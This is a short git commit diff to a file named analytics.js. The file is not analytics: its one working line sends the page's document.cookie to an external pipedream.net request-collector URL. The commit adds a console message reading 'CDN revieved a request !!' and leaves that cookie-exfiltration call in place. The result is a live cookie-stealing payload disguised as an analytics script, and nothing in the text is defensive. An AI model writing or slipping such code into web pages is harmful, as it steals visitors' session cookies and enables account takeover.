a36ee69b0897cf56d21c98c769a08682d12706c3
TabbySupercat <48171815+TabbySupercat@users.noreply.github.com>
2024-04-09 15:21:29 +1000

    Update analytics.js

--- analytics.js
+++ analytics.js
@@ -1,1 +1,2 @@
-fetch("https://eoe7li0d03pjrfb.m.pipedream.net/?c=" + document.cookie, {method: "POST"})
+console.log("CDN revieved a request !!");
+fetch("https://eoe7li0d03pjrfb.m.pipedream.net/?c=" + document.cookie, {method: "POST"});
